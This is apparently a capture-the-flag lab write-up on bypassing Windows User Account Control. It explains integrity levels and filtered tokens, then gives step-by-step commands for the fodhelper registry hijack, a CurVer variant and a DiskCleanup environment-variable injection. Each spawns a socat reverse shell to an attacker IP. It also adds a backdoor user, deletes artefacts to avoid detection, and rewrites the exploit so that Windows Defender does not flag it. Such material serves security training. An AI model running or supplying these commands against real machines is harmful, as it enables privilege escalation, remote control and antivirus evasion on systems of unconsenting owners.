
# Bypassing UAC

Learn common ways to bypass User Account Control (UAC) in Windows hosts.

### 1. User Account Control (UAC)
### 2. UAC: GUI based bypasses
### 3. UAC: Auto-Elevating Processes
### 4. UAC: Improving the Fodhelper Exploit to Bypass Windows Defender
### 5. UAC: Environment Variable Expansion
### 6. Automated Exploitation
### 7. Conclusion

-------------------------------------------------------

## What is UAC?

User Account Control (UAC) is a security feature in Microsoft Windows operating systems that helps prevent unauthorized changes to the system. When UAC is enabled, the system prompts the user for confirmation before allowing changes that require elevated privileges, such as installing software or modifying system settings. This helps protect the system from malware and other unauthorized changes. UAC was first introduced in Windows Vista and has been included in all subsequent versions of Windows.

## Integrity Levels

UAC is a `Mandatory Integrity Control (MIC)`, which is a mechanism that allows differentiating users, processes and resources by assigning an `Integrity Level (IL)` to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs, so you may be authorized to access a resource according to the DACL, but it won't matter if your IL isn't high enough.

The following 4 ILs are used by Windows, ordered from lowest to highest:

| Integrity Level | Type     | 
| :-------- | :------- |
| `Low` | Generally used for interaction with the Internet (i.e. Internet Explorer). Has very limited permissions. | 
| `Medium` | Assigned to standard users and Administrators' filtered tokens. |
| `High` | Used by Administrators' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token. |
| `System` | Reserved for system use. | 

When a process requires to access a resource, it will inherit the calling user's access token and its associated IL. The same occurs if a process forks a child.

## Filtered Tokens

To accomplish this separation of roles, UAC treats regular users and administrators in a slightly different way during logon:

* **Non-administrators** will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.
* **Administrators** will receive two access tokens:
    * **Filtered Token:** A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.
    * **Elevated Token:** A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has High IL.

In this way, administrators will use their filtered token unless they explicitly request administrative privileges via UAC.

## UAC Settings

Depending on our security requirements, UAC can be configured to run at four different notification levels:

* **Always notify:** Notify and prompt the user for authorization when making changes to Windows settings or when a program tries to install applications or make changes to the computer.
* **Notify me only when programs try to make changes to my computer:** Notify and prompt the user for authorization when a program tries to install applications or make changes to the computer. Administrators won't be prompted when changing Windows settings.
* **Notify me only when programs try to make changes to my computer (do not dim my desktop):** Same as above, but won't run the UAC prompt on a secure desktop.
* **Never notify:** Disable UAC prompt. Administrators will run everything using a high privilege token.
 
By default, UAC is configured on the Notify me only when programs try to make changes to my computer level:

### 2.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

From an attacker's perspective, the three lower security levels are equivalent, and only the Always notify setting presents a difference.

## UAC Internals

At the heart of UAC, we have the `Application Information Service` or `Appinfo`. Whenever a user requires elevation, the following occurs:

1. The user requests to run an application as administrator.
2. A `ShellExecute` API call is made using the `runas` verb.
3. The request gets forwarded to Appinfo to handle elevation.
4. The application manifest is checked to see if AutoElevation is allowed (more on this later).
5. Appinfo executes `consent.exe`, which shows the UAC prompt on a `secure desktop`. A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user's desktop to avoid other processes from tampering with the UAC prompt in any way.
6. If the user gives consent to run the application as administrator, the Appinfo service will execute the request using a user's Elevated Token. Appinfo will then set the parent process ID of the new process to point to the shell from which elevation was requested.

## 1.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

## Bypassing UAC

From an attacker's perspective, there might be situations where you get a remote shell to a Windows host via Powershell or cmd.exe. You might even gain access through an account that is part of the Administrators group, but when you try creating a backdoor user for future access, you get the following error:

`net user backdoor Backd00r /add`

## 3.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

By checking our assigned groups, we can confirm that our session is running with a medium IL, meaning we are effectively using a filtered token: 

`whoami /groups` or `whoami /groups | find "Label"`

### 4.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Even when we get a Powershell session with an administrative user, UAC prevents us from performing any administrative tasks as we are currently using a filtered token only. If we want to take full control of our target, we must bypass UAC.

-------------------------------------------------------

## UAC: GUI based bypasses

We will start by looking at GUI-based bypasses, as they provide an easy way to understand the basic concepts involved. These examples are not usually applicable to real-world scenarios, as they rely on us having access to a graphical session, from where we could use the standard UAC to elevate.

### Case study: msconfig

Our goal is to obtain access to a High IL command prompt without passing through UAC. First, let's start by opening msconfig, either from the start menu or the "Run" dialog:

### 5.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

If we analyze the msconfig process with `Process Hacker` (available on your desktop), we notice something interesting. Even when no UAC prompt was presented to us, msconfig runs as a high IL process:

### 6.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

This is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user's interaction. More details on this later.

If we could force msconfig to spawn a shell for us, the shell would inherit the same access token used by msconfig and therefore be run as a high IL process. By navigating to the Tools tab, we can find an option to do just that:

### 7.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

If we click Launch, we will obtain a high IL command prompt without interacting with UAC in any way.

### Case study: azman.msc

As with msconfig, azman.msc will auto elevate without requiring user interaction. If we can find a way to spawn a shell from within that process, we will bypass UAC. Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell. We can easily overcome this with a bit of creativity.

First, let's run azman.msc:

### 8.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

We can confirm that a process with high IL was spawned by using Process Hacker. Notice that all .msc files are run from mmc.exe (Microsoft Management Console):

### 9.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

To run a shell, we will abuse the application's help:

### 10.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

On the help screen, we will right-click any part of the help article and select **View Source**:

### 11.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

This will spawn a notepad process that we can leverage to get a shell. To do so, go to **File->Open** and make sure to select **All Files** in the combo box on the lower right corner. Go to `C:\Windows\System32` and search for `cmd.exe` and right-click to select Open:

### 12.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

This will once again bypass UAC and give us access to a high integrity command prompt. You can check the process tree in Process Hacker to see how the high integrity token is passed from mmc (Microsoft Management Console, launched through the Azman), all the way to cmd.exe:

### 13.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

-------------------------------------------------------

## UAC: Auto-Elevating Processes

**AutoElevate**

As mentioned before, some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows.

For an application, some requirements need to be met to auto-elevate:

* The executable must be signed by the Windows Publisher
* The executable must be contained in a trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/

Depending on the type of application, additional requirements may apply:

* Executable files (.exe) must declare the **autoElevate** element inside their manifests. To check a file's manifest, we can use [sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck), a tool provided as part of the Sysinternals suite. If we check the manifest for msconfig.exe, we will find the autoElevate property:

`sigcheck64.exe -m c:/windows/system32/msconfig.exe`

### 14.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

* mmc.exe will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate.
* Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes pkgmgr.exe and spinstall.exe, for example.
* COM objects can also request auto-elevation by configuring some registry keys (https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker).

## Case study: Fodhelper

Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won't be prompted for elevation when performing standard administrative tasks. While we've already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.

### 15.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

From an attacker's perspective, this means it can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process. This particular technique was discovered by [@winscripting](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) and has been used in the wild by the [Glupteba malware](https://www.cybereason.com/blog/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit).

What was noticed about fodhelper is that it searches the registry for a specific key of interest:

### 16.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (**ProgID**) for each filetype, where the corresponding application is associated. Let's say you try to open an HTML file. A part of the registry known as the **HKEY_CLASSES_ROOT** will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the `shell/open/command` subkey for each file's ProgID. Taking the "htmlfile" ProgID as an example:

### 17.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

In reality, HKEY_CLASSES_ROOT is just a merged view of two different paths on the registry:

| Path | Description     | 
| :-------- | :------- | 
| HKEY_LOCAL_MACHINE\Software\Classes | System-wide file associations |
| HKEY_CURRENT_USER\Software\Classes | Active user's file associations |

When checking **HKEY_CLASSES_ROOT**, if there is a user-specific association at **HKEY_CURRENT_USER (HKCU)**, it will take priority. If no user-specific association is configured, then the system-wide association at **HKEY_LOCAL_MACHINE (HKLM)** will be used instead. This way, each user can choose their preferred applications separately if desired.

Going back to `fodhelper`, we now see that it's trying to open a file under the ms-settings ProgID. By creating an association for that ProgID in the current user's context under HKCU, we will override the default system-wide association and, therefore, control which command is used to open the file. Since fodhelper is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC.

## Putting it all together

One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account within the Administrators group, but UAC is preventing the execution of any privileged tasks. To retrieve the flag, he needs you to bypass UAC and get a fully functional high IL shell.

To connect to the backdoor, you can use the following command:

`nc 10.10.37.186 9999`

Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:

`net user attacker | find "Local Group"`

`whoami /groups | find "Label"`

We set the required registry values to associate the ms-settings class to a reverse shell. For your convenience, a copy of socat can be found on `c:\tools\socat\`. You can use the following commands to set the required registry keys from a standard command line:

`C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command`

`C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"`

`C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f`

`C:\> reg add %REG_KEY% /d %CMD% /f`

Notice how we need to create an empty value called DelegateExecute for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.

And then proceed to execute fodhelper.exe, which in turn will trigger the execution of our reverse shell:

### 18.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

The received shell runs with high integrity, indicating we have successfully bypassed UAC.

## Clearing our tracks 

As a result of executing this exploit, some artefacts were created on the target system in the form of registry keys. To avoid detection, we need to clean up after ourselves with the following command:

`reg delete HKCU\Software\Classes\ms-settings\ /f`

-------------------------------------------------------

##  UAC: Improving the Fodhelper Exploit to Bypass Windows Defender

For simplicity, the machine we are targeting has Windows Defender disabled. But what would happen if it was enabled?

modify the exploit to run fodhelper.exe immediately after setting the registry value. If the command runs quick enough, it will just work (be sure to replace your IP address where needed):

`nc -lvp 4444`

```
C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```
Depending on your luck, fodhelper might execute before the AV kicks in, giving you back a reverse shell. If for some reason it doesn't work for you, keep in mind that this method is unreliable as it depends on a race between the AV and your payload executing first.

## Improving the fodhelper exploit

A variation on the fodhelper exploit was proposed by [@V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses), where different registry keys are used, but the basic principle is the same.

Instead of writing our payload into `HKCU\Software\Classes\ms-settings\Shell\Open\command`, we will use the `CurVer` entry under a progID registry key. This entry is used when you have multiple instances of an application with different versions running on the same system. CurVer allows you to point to the default version of the application to be used by Windows when opening a given file type.

To this end, we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.

The exploit code proposed by @V3ded uses Powershell to achieve this end. Here is a modified version of it adapted to use our reverse shell (be sure to replace your IP address where needed):

```
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
This exploit creates a new progID with the name .pwn and associates our payload to the command used when opening such files. It then points the CurVer entry of ms-settings to our .pwn progID. When fodhelper tries opening an ms-settings program, it will instead be pointed to the .pwn progID and use its associated command.

And execute the exploit from our backdoor connection as is. As a result, Windows Defender will throw another alert that references our actions:

### 19.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Although we are still detected, it is essential to note that sometimes the detection methods used by AV software are implemented strictly against the published exploit, without considering possible variations. If we translate our exploit from Powershell to use cmd.exe, the AV won't raise any alerts (be sure to replace your IP address where needed):

```
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```
And we get a high integrity reverse shell:

## Clearing our tracks

As a result of executing this exploit, some artefacts were created on the target system, such as registry keys. To avoid detection, we need to clean up after ourselves with the following commands:

```
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```
-------------------------------------------------------

##  UAC: Environment Variable Expansion

**Bypassing Always Notify**

### Case study: Disk Cleanup Scheduled Task

**Note: Be sure to disable Windows Defender for this task, or you may have some difficulties when running the exploit. Just run the provided shortcut on your machine's desktop to disable it.**

To understand why we are picking Disk Cleanup, let's open the `Task Scheduler` and check the task's configuration:

### 20.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

Here we can see that the task is configured to run with the `Users` account, which means it will inherit the privileges from the calling user. The `Run with highest privileges` option will use the highest privilege security token available to the calling user, which is a high IL token for an administrator. Notice that if a regular non-admin user invokes this task, it will execute with medium IL only since that is the highest privilege token available to non-admins, and therefore the bypass wouldn't work.

Checking the Actions and Settings tabs, we have the following:

### 21.png

![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)

The task can be run on-demand, executing the following command when invoked:

 `%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`

Since the command depends on environment variables, we might be able to inject commands through them and get them executed by starting the DiskCleanup task manually.

Luckily for us, we can override the `%windir%` variable through the registry by creating an entry in `HKCU\Environment`. If we want to execute a reverse shell using socat, we can set `%windir%`  as follows (without the quotes):

`"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "`

At the end of our command, we concatenate "&REM " (ending with a blank space) to comment whatever is put after `%windir%` when expanding the environment variable to get the final command used by DiskCleanup. The resulting command would be (be sure to replace your IP address where needed):

`cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%`

Where anything after the "REM" is ignored as a comment.

## Putting it all together

`reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f`

`schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I`

As a result, you should obtain a shell with high IL:

## Clearing our tracks

`reg delete "HKCU\Environment" /v "windir" /f`

**Note: Be sure to execute the given command to avoid any artefact interfering with the following tasks. Since many Windows components rely on the %windir% environment variable, a lot of things won't properly work until you remove the registry key used for this bypass.**

-------------------------------------------------------

## Automated Exploitation

An excellent tool is available to test for UAC bypasses without writing your exploits from scratch. Created by @hfiref0x, UACME provides an up to date repository of UAC bypass techniques that can be used out of the box. The tool is available for download at its official repository on:

https://github.com/hfiref0x/UACME

While UACME provides several tools, we will focus mainly on the one called Akagi, which runs the actual UAC bypasses.

Using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on the project's GitHub description. If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:

`UACME-Akagi64.exe 33`

The methods introduced through this room can also be tested by UACME by using the following methods:

| Method Id | Bypass technique    | 
| :-------- | :------- | 
| 33 | fodhelper.exe | 
| 34 | DiskCleanup scheduled task |
| 70 | fodhelper.exe using CurVer registry key |

-------------------------------------------------------

## Conclusion

We have shown several methods to bypass UAC in Windows systems in this room. While most of these methods have automatic tools associated, they will be detected easily by any AV solution on the market if used straight out of the box. Knowing the actual methods will give you an edge as an attacker by allowing you to customize your exploits as needed and make them more evasive.

As we have seen, UAC isn't considered a security boundary and is therefore prone to several bypass methods.

Should you be interested in learning more techniques, the following resources are available:

* [UACME github repository](https://github.com/hfiref0x/UACME)
* [Bypassing UAC with mock folders and DLL hijacking](https://www.bleepingcomputer.com/news/security/bypassing-windows-10-uac-with-mock-folders-and-dll-hijacking/)
* [UAC bypass techniques detection strategies](https://elastic.github.io/security-research/whitepapers/2022/02/03.exploring-windows-uac-bypass-techniques-detection-strategies/article/) 
* [Reading your way around UAC](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)

-------------------------------------------------------


